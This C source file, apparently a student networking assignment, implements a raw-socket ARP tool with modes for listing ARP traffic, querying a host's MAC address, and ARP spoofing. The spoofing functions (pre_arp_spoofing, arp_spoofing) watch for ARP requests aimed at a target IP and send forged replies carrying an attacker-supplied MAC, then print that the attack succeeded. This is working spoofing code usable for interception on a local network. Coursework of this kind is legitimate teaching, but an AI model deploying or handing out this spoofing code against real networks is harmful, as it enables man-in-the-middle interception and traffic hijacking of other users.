#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"
#include <netinet/in.h>
#include <arpa/inet.h>


#include <fcntl.h> // for open
#include <unistd.h> // for close

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>


//----------------
static void Print_Format();
void list_arp(char *argv[]);
void arp_preprocess(struct ether_addr *mac, struct in_addr *ip);
void print_arp(struct ether_arp *arp);
void arp_query(char *argv[]);
void pre_arp_spoofing(char *argv[]);
void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet);
void reply_arp_fake(struct ether_addr *mac, struct in_addr *ip);
void reply_packet(struct ether_addr *mac, struct ether_arp *pa, struct arp_packet *reply, struct sockaddr_ll *vt);
//void pre_arp_query(char *argv[]);
//----------------
/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
//#define DEVICE_NAME "enp2s0f5"
#define DEVICE_NAME "ens33"

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

static char fmac[20];
static void Print_Format()
{
	printf("Format:\n");
	printf("1) ./arp -l -a\n");
	printf("2) ./arp -l <filter_ip_address>\n");
	printf("3) ./arp -q <query_ip_address>\n");
	printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
	exit(0);
}
 
int main(int argc, char *argv[])
{
	
	if(argc == 2 && strcmp(argv[1],"-h")==0)
	{
		Print_Format();
	}
	else if( argc == 3 )
	{
		if(strcmp(argv[1],"-l")==0)
			list_arp(argv); // ./arp list -a | filter IP address
		else if(strcmp(argv[1],"-q")==0)
			arp_query(argv);
		else if(strlen(argv[1])==17 && strlen(argv[2])>=7)
			pre_arp_spoofing(argv);
		else
			printf("Format error !\nUsage: sudo %s -h for help\n",argv[0]);
	
	}
	else 
	{
		if(argc<1)
			puts("ERROR: You must be root to use this tool!");
		else
		{
			//fprintf(stderr,"Usage: sudo %s [OPTION]... [ADDRESS]...\n",argv[1]);
			printf("Format error !\nUsage: sudo %s -h for help\n",argv[0]);
		}
	}
	//struct in_addr myip;
	
	//clear recv/send buffer
	/*bzero(buffer_recv,sizeof(buffer_recv));
	bzero(buffer_send,sizeof(buffer_send));
	bzero(&req, sizeof(req));
	strcpy(req.ifr_name,DEVICE_NAME); //get IC name 
	puts(&req);
	socklen_t sa_len; 
	sa_len = sizeof(struct sockaddr_ll);
	
	//Fill the parameters of the sa.
	/*bzero(&sa, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ARP); //只接受發往本機mac的arp類型的資料幀
	sa.sll_ifindex = if_nametoindex(DEVICE_NAME); //mappings between network interface names and indexes
	
	
	
	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open recv socket error");
		exit(1);
	}

	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 */
	/*recvfrom(sockfd_recv,buffer_recv,sizeof(buffer_recv),0,(struct sockaddr*)&sa, &sa_len);


	
	//Open a send socket in data-link layer.
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}
	
	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
`	 * ioctl( ... )
	 */
	/*if( ioctl(sockfd_send, SIOCGIFADDR, &req)==-1)
	{
		perror("ioctl error");
		exit(1);
	}
	
	

	
	/*
	 * use sendto function with sa variable to send your packet out
	 * sendto( ... )
	 */
	/*sendto(sockfd_send,buffer_send,sizeof(buffer_send), 0, (struct sockaddr*)&sa, &sa_len);
	
	while(1)
	{
		bzero(buffer_recv,sizeof(buffer_recv));
		recvfrom(sockfd_recv,buffer_recv,sizeof(buffer_recv),0,(struct sockaddr*)&sa, &sa_len);
		puts(buffer_recv);
	}

*/
	return 0;
}

void list_arp(char *argv[])
{
	struct in_addr filter_ip;
	// ./arp -l -a
	if(strcmp(argv[2], "-a") == 0)
		arp_preprocess(NULL, NULL);
	else
	{
		filter_ip.s_addr = inet_addr(argv[2]);

		// check for IP
		if(filter_ip.s_addr < 0)
			Print_Format();
		else
			arp_preprocess(NULL, &filter_ip);	// ./arp list <target_ip_addr>
	}
	return;
}

void print_arp(struct ether_arp *arp)
{
	char target_address[100], sender_address[100] ;
	char arp_info[100];
	
	bzero(arp_info,sizeof(arp_info));
	
	sprintf(arp_info,"Get arp packet - Who has %s?                   Tell %s\n",get_target_protocol_addr(arp, target_address),get_sender_protocol_addr(arp, sender_address));
	printf("%s",arp_info);
}
void arp_query(char *argv[])
{
	puts("[    ARP query mode    ]");
	struct arp_packet query;
	struct ether_arp arp;
	struct sockaddr_ll sa;
	struct in_addr target_address;
	char packet[200];
	int sock_send, sock_recv, fd;
	char query_info[100], mac_info[100], get_ip[200], get_mac[200], info[100], query_ip[10];
	
	bzero(&sa,sizeof(sa));

	sock_recv = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	sock_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_RARP));
	if(sock_send <0 || sock_recv <0)
	{
		perror("ARP query socket error");
	}
	
	//strcpy(query_ip,argv[2]);
	inet_pton(AF_INET, argv[2], &target_address);
	
	memcpy(&query.eth_hdr.ether_dhost,"\xff\xff\xff\xff\xff\xff",ETH_ALEN); // query <- Destination MAC address
	memcpy(&query.eth_hdr.ether_shost, get_inf_mac(get_mac, DEVICE_NAME),ETH_ALEN);  // query <- Source MAC address
	
	query.eth_hdr.ether_type = htons(ETH_P_ARP); // set protocol type -> ARP (0x0806)
	
	set_hard_type(&query.arp, ARPHRD_ETHER); // set as ethernet
	set_hard_size(&query.arp, ETH_ALEN); // ehternet length
	set_prot_type(&query.arp,ETHERTYPE_IP);
	set_prot_size(&query.arp, 4); // IP length        
	set_op_code(&query.arp, ARPOP_REQUEST); //set ARP op code -reply 
	
	set_sender_hardware_addr(&query.arp, (get_inf_mac(get_mac,DEVICE_NAME)));
	set_sender_protocol_addr(&query.arp, (get_inf_ip(get_ip, DEVICE_NAME)));
	set_target_hardware_addr(&query.arp, "\x00\x00\x00\x00\x00\x00"); // unknown -> we wanna try to seek 
	set_target_protocol_addr(&query.arp, (char *)&target_address);	// set target pa 
	
	// set sa
	//strcpy(sa.sa_data, DEVICE_NAME);
	sa.sll_family = AF_PACKET;
	sa.sll_ifindex = if_nametoindex(DEVICE_NAME);
	sa.sll_halen = ETH_ALEN;
	
	sendto(sock_send, &query, sizeof(query), 0,(struct sockaddr*)&sa, sizeof(sa));
	
	while(1)
	{
		bzero(&arp,sizeof(packet));
		read(sock_recv, &arp, sizeof(arp));
		if(memcmp(arp.arp_spa, &target_address,sizeof(arp.arp_tpa))==0) 
		{
			printf("MAC address of %s is %s\n", argv[2], get_sender_hardware_addr(&arp, query_info));
			break;
		}
	}
	close(sock_send);
	close(sock_recv);

}

/*void pre_arp_query(char *argv[])
{
	struct ehter_arp arp;
	struct in_addr query_ip;
	int sockfd;
	
	sockfd = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	strcpy(target_ip, argv[2]);
	
	if(sockfd <0)
	{
		perror("ARP query socket error");
	}
	
	while(1)
	{
		bzero(&arp,sizeof(arp));
		read(sockfd, &arp, sizeof(arp));
		if(memcmp(arp.arp_tpa, target_ip, sizeof(arp.arp_tpa)) ==0)
			arp_query(arp,target_ip);
	
	}

}*/

void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
{
	struct ether_arp arp;
	int sockfd;
	
	sockfd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	//sockfd = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
	
	if(sockfd <0)
	{
		perror("ARP list socket error");
	}
	
	while(1)
	{
		bzero(&arp,sizeof(arp));
		read(sockfd, &arp, sizeof(arp));
		
		if(ip ==NULL)
			print_arp(&arp);
			
		else
		{
			if(memcmp(arp.arp_tpa, ip, sizeof(arp.arp_tpa)) ==0)
			{
				if(mac != NULL)
				{
					puts("[   ARP spoofing mode   ]");
					print_arp(&arp);
					arp_spoofing(mac, &arp); // ./arp <fake_mac_address> <target_ip_address>
				}	
				
				else
					print_arp(&arp); //Print ./arp -l <filter_ip_address>
			}
		}
	}
	close(sockfd);
	return ;
}



void pre_arp_spoofing(char *argv[])
{
	struct in_addr target_ip;
	struct ether_addr *mac, reply;
	
	target_ip.s_addr = inet_addr(argv[2]);
	mac = ether_aton(argv[1]);
	strcpy(fmac,argv[1]);
	
	
	memcpy(&reply, mac, ETH_ALEN);
	
	if(target_ip.s_addr <0 )
	{
		Print_Format();
		exit(0);
	}
	
	if(mac == NULL)
	{
		Print_Format();
		exit(0);
	}
	
	arp_preprocess(&reply,&target_ip);
}

void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet)
{
	char arp_info[100];
	int sendfd;
	struct arp_packet rp;
	struct sockaddr_ll victim;
	
	sendfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); //reply socket
	bzero(&victim, sizeof(victim));
	
	// set packet hardware 
	memcpy(&rp.eth_hdr.ether_dhost, packet->arp_sha, ETH_ALEN);
	memcpy(&rp.eth_hdr.ether_shost, fakemac, ETH_ALEN);
	rp.eth_hdr.ether_type = htons(ETH_P_ARP);
	
	set_hard_type(&rp.arp, ARPHRD_ETHER); // ethernet
	set_hard_size(&rp.arp, ETH_ALEN); // ehternet length
	set_prot_type(&rp.arp,ETHERTYPE_IP); // IP 
	set_prot_size(&rp.arp, 4); // IP length        
	set_op_code(&rp.arp, ARPOP_REPLY); //set ARP op code -reply 
	
	set_sender_hardware_addr(&rp.arp, (unsigned char *)fakemac);
	set_sender_protocol_addr(&rp.arp, (unsigned char *)(packet->arp_tpa));
	set_target_hardware_addr(&rp.arp, (unsigned char *)(packet->arp_sha)); // set target hrd as orig sender hrd
	set_target_protocol_addr(&rp.arp, (unsigned char *)(packet->arp_spa));	// set target pa as orig sender pa
	
	// set 
	victim.sll_family = AF_PACKET;
	victim.sll_ifindex = if_nametoindex(DEVICE_NAME);
	//victim.sll_ifindex = getInterfaceByName(sendfd, DEVICE_NAME);
	victim.sll_halen = ETH_ALEN;
	memcpy(victim.sll_addr, fakemac, ETH_ALEN);
	
	// send arp reply
	sendto(sendfd, &rp, sizeof(rp), 0, (struct sockaddr *)&victim, sizeof(victim));
	
	if(sendfd < 0)
	{
		perror("arp spoofing sendfd error");
		exit(0);
	}
	printf("Sent ARP reply: %s is %s\n",get_target_protocol_addr(packet, arp_info),fmac);
	printf("ARP spoofing attack 'SUCCESS'!\n");
	close(sendfd);
	
}

/*void reply_packet(struct ether_addr *mac, struct ether_arp *pa, struct arp_packet *reply, struct sockaddr_ll *vt)
{
	memcpy(reply->eth_hdr.ether_dhost, pa->arp_sha, ETH_ALEN);
	memcpy(reply->eth_hdr.ether_shost, mac, ETH_ALEN);
	reply->eth_hdr.ether_type = htons(ETH_P_ARP);
	
	set_hard_type(reply->arp, ARPHRD_ETHER); // ethernet
	set_hard_size(reply->arp, ETH_ALEN); // ehternet length
	set_prot_type(reply->arp,ETHERTYPE_IP); // IP 
	set_prot_size(reply->arp, 4); // IP length        
	set_op_code(&rp.arp, ARPOP_REPLY); //set ARP op code -reply 
	
	set_sender_hardware_addr(&rp.arp, (unsigned char *)fakemac);
	set_sender_protocol_addr(&rp.arp, (unsigned char *)(pa->arp_tpa));
	set_target_hardware_addr(&rp.arp, (unsigned char *)(pa->arp_sha)); // set target hrd as orig sender hrd
	set_target_protocol_addr(&rp.arp, (unsigned char *)(pa->arp_spa));	// set target pa as orig sender pa
	
	
	
	vt->sll_family = AF_PACKET;
	vt->sll_ifindex = if_nametoindex(DEVICE_NAME);
	//victim.sll_ifindex = getInterfaceByName(sendfd, DEVICE_NAME);
	vt->sll_halen = ETH_ALEN;
	memcpy(vt->sll_addr, mac, ETH_ALEN);

}*/


